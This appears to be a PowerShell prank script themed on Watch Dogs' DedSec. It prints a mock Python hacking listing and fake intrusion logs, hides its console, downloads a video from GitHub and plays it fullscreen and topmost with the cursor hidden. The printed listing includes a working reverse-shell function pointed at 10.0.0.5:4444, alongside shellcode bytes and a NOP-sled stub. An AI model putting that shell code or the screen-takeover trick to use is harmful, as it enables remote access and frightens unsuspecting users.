Clear-Host
$Host.UI.RawUI.WindowTitle = "DEDSEC // HACKER TERMINAL"

[Console]::OutputEncoding = [System.Text.UTF8Encoding]::new()
$OutputEncoding = [Console]::OutputEncoding

$art = @'
                                                                                                   
                                                                                                   
                                          33333                                                    
                                  3333333333333332     33333333333                                 
                                 333333333333333333   2333333333333333                             
                          3333    333333333333333333 233333333333333333     3                      
                        3333333   333333333333333333 333333333333333333    33333                   
                    333333333332   3333333   3333333 33333333    333333  333333333                 
                  3333333333333    2333333   3333333 3333333333  333333 3333333333333              
                3333333333333       3333333  3333333   33333333333      3333333333333333           
               33333333333   23333  3333333  3333333      3333333333  33333333333333333333         
                 33333332  2333333   333333333333333 333333    3333   3333332  33333333332         
                  333333333333333    333333333333333 3333333333333   33333333     333332           
         3333333    33333333333   23  33333333333332 3333333333333  3333333333333          33      
       333333333333  233333333333333  333333323333     23333333333 3333333333333333    33333333    
     3333333333333333  33333333333333                             33333333   3333   333333333333   
    333333333333333333  233333333333                                33333333     3333333333333333  
   333333333333333333333  3333333                                      333333  3333333333333333333 
  3333333333     333333333   33                                          33  233333333  33333333333
 33333333333332    33333333             3333333333333333                    3333333      3333333333
  2323333333333333333333333            3333332      2333333                  33333      33333333333
       3333333333333333333          23333                 3333                33333333  3333333333 
          333333333333333           333                     3333               33333333  3         
              3333333333          333                         3333                                 
                  3333           333                            3333                               
                                 333333333                       3333                              
                                333333333333                       3333                            
                               33333333333333                       3333                           
                              23333333333333333                       333                          
                              3333333333333333333                     2333                         
                              33333333333333333333                     333                         
                             3333333333333333333333                   3333                         
                            333333333333333333333333                  333                          
                             33333333333333333333333          3333    333                          
                             333333333     2333333333        23  3332 333                          
                              233333  3332  333333333          33332  3333                         
                               3333333333333333333333 233333333  233333233                         
                                33333333333333333333 3333333333   33333333                         
                                 3333333333333333   33333333333   3333333                          
                                  33333333333333     33333333 3333333 3                            
                                  333333333333333333   33333 23333    3                            
                                    333333333333333333       3333   3332                           
                                      33333333333333333      2333  332                             
                                         3333 333333333333        33                               
                                         333  333333333333333 233 33                               
                                          333 3333333333333333333 33                               
                                            33   3333333333333333 33                               
                                             333333    23  3333  333                               
                                              23333333         333                                 
                                                  233332      33                                   
                                                     3333333333                                    
                                                                                                   
                                                                                                   
                                                                                                   
'@

$art -split "`r?`n" | ForEach-Object {
    Write-Host $_ -ForegroundColor Green
    Start-Sleep -Milliseconds 20
}

Write-Host ""
Write-Host "Hack The World!" -ForegroundColor Green
Start-Sleep -Milliseconds 600

$pythonCode = @(
    "import socket, os, sys, time"
    "from ctypes import *"
    ""
    "TARGET = '192.168.1.10'"
    "PORT   = 4444"
    ""
    "def generate_payload(size=1024):"
    "    return b'\x90' * size + b'\xcc'"
    ""
    "def scan_ports(target, start=1, end=65535):"
    "    for p in range(start, end+1):"
    "        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"
    "        s.settimeout(0.05)"
    "        if s.connect_ex((target, p)) == 0:"
    "            print(f'[+] Open port: {p}')"
    "        s.close()"
    ""
    "class Shellcode:"
    "    def __init__(self, arch='x64'):"
    "        self.arch = arch"
    "        self.raw = b'\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68'"
    "    def inject(self, pid):"
    "        print(f'[*] Injecting shellcode into PID {pid}...')"
    "        time.sleep(0.3)"
    ""
    "def brute_ssh(target, users, passwords):"
    "    for u in users:"
    "        for p in passwords:"
    "            print(f'[*] Trying {u}:{p} on {target}')"
    "            time.sleep(0.02)"
    ""
    "def exploit_cve_2025_fake(target):"
    "    print(f'[*] Sending malformed packet to {target}...')"
    "    time.sleep(0.4)"
    "    print('[+] Vulnerability triggered (simulation)')"
    ""
    "def dump_hashes():"
    "    print('[*] Reading SAM database...')"
    "    time.sleep(0.5)"
    "    print('[+] Hashes extracted (fake)')"
    ""
    "def escalate_privileges():"
    "    print('[*] Token manipulation...')"
    "    time.sleep(0.3)"
    "    print('[+] Running as SYSTEM (simulation)')"
    ""
    "def clear_logs():"
    "    print('[*] Wiping event logs...')"
    "    time.sleep(0.4)"
    "    print('[+] Logs cleared (fake)')"
    ""
    "def reverse_shell(host, port):"
    "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"
    "    s.connect((host, port))"
    "    os.dup2(s.fileno(), 0)"
    "    os.dup2(s.fileno(), 1)"
    "    os.dup2(s.fileno(), 2)"
    "    os.system('cmd.exe')"
    ""
    "if __name__ == '__main__':"
    "    print('[*] Starting main routine...')"
    "    scan_ports(TARGET, 1, 1024)"
    "    exploit_cve_2025_fake(TARGET)"
    "    escalate_privileges()"
    "    dump_hashes()"
    "    reverse_shell('10.0.0.5', 4444)"
    ""
    "# Additional fake modules"
    "import hashlib, base64, struct, random"
    ""
    "def generate_key():"
    "    return hashlib.sha256(os.urandom(32)).hexdigest()"
    ""
    "def encrypt_data(data, key):"
    "    print('[*] Encrypting data with AES-256 (fake)...')"
    "    time.sleep(0.2)"
    "    return base64.b64encode(data)"
    ""
    "class Rootkit:"
    "    def __init__(self):"
    "        self.hidden = True"
    "    def hook_syscalls(self):"
    "        print('[*] Hooking syscalls...')"
    "        time.sleep(0.3)"
    "    def hide_process(self, pid):"
    "    print(f'[*] Hiding process {pid}...')"
    "        time.sleep(0.1)"
    ""
    "def memory_dump(pid):"
    "    print(f'[*] Dumping memory of PID {pid}...')"
    "    time.sleep(0.4)"
    "    print('[+] Memory saved to dump.bin (fake)')"
    ""
    "def inject_dll(pid, path):"
    "    print(f'[*] Injecting {path} into PID {pid}...')"
    "    time.sleep(0.3)"
    "    print('[+] DLL injected (simulation)')"
    ""
    "def disable_defender():"
    "    print('[*] Disabling Windows Defender...')"
    "    time.sleep(0.5)"
    "    print('[+] Defender disabled (fake)')"
    ""
    "def exfiltrate_data(source, dest):"
    "    print(f'[*] Exfiltrating {source} -> {dest}...')"
    "    time.sleep(0.4)"
    "    print('[+] Data exfiltrated (simulation)')"
    ""
    "# Main loop"
    "while True:"
    "    print('[*] Running background tasks...')"
    "    time.sleep(1)"
)

Write-Host ""
foreach ($line in $pythonCode) {
    Write-Host $line -ForegroundColor Green
    Start-Sleep -Milliseconds (Get-Random -Minimum 15 -Maximum 50)
}

Write-Host ""
for ($i = 0; $i -lt 120; $i++) {
    $hex = "0x{0:X8}" -f (Get-Random -Maximum 4294967295)
    $log = "[THREAD_{0:D4}] Executing payload at {1}" -f $i, $hex
    Write-Host $log -ForegroundColor Green
    Start-Sleep -Milliseconds 30
}

Clear-Host

$wdSteps = @(
    "[*] Connecting to ctOS backdoor..."
    "[*] Bypassing ICE firewall..."
    "[*] Injecting watchdog_daemon.py..."
    "[*] Scanning network nodes..."
    "[+] Node 192.168.1.10 compromised"
    "[*] Escalating privileges..."
    "[+] Root access obtained"
    "[*] Downloading user data..."
)

foreach ($s in $wdSteps) {
    Write-Host $s -ForegroundColor Green
    Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 2)
}

# Uploading virus signature...
Write-Host "[*] Uploading virus signature..." -ForegroundColor Green
Start-Sleep -Seconds 5

# Запускаем видео сразу после Uploading virus signature
Write-Host "[+] Executing video payload..." -ForegroundColor Green

# Скрытие консоли и запуск видео
try {
    $c = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);'
    $t = Add-Type -MemberDefinition $c -Name "W" -Namespace "Win" -PassThru
    $t::ShowWindow((Get-Process -Id $pid).MainWindowHandle, 0) | Out-Null
} catch {}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase

# Настройки
$u = 'https://github.com/ymkeee/watchdogs/raw/refs/heads/main/dedsec.wmv'
$f = "$env:TEMP\dedsec_video.wmv"

try {
    # Загрузка видео (часть "вирусной сигнатуры")
    Invoke-WebRequest -Uri $u -OutFile $f -ErrorAction Stop
    Write-Host "[+] Video payload ready" -ForegroundColor Green
    
    # Создание UI для проигрывателя
    $xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    WindowStyle="None" 
    WindowState="Maximized" 
    Topmost="True"
    Background="Black" 
    Cursor="None" 
    ShowInTaskbar="False">
    <Grid><MediaElement Name="v" Source="$f" LoadedBehavior="Play" Stretch="Uniform" /></Grid>
</Window>
"@

    $reader = New-Object System.Xml.XmlNodeReader ([xml]$xaml)
    $w = [Windows.Markup.XamlReader]::Load($reader)
    $v = $w.FindName("v")

    # Закрытие окна при завершении видео
    $v.add_MediaEnded({
        $w.Close()
    })

    # Показ окна
    $w.ShowDialog() | Out-Null
}
catch { 
    # Выход при ошибке
    exit 
}
finally {
    # Очистка и удаление временного файла
    if (Test-Path $f) { 
        Remove-Item $f -Force -ErrorAction SilentlyContinue 
    }
    Stop-Process -Id $pid -Force
}
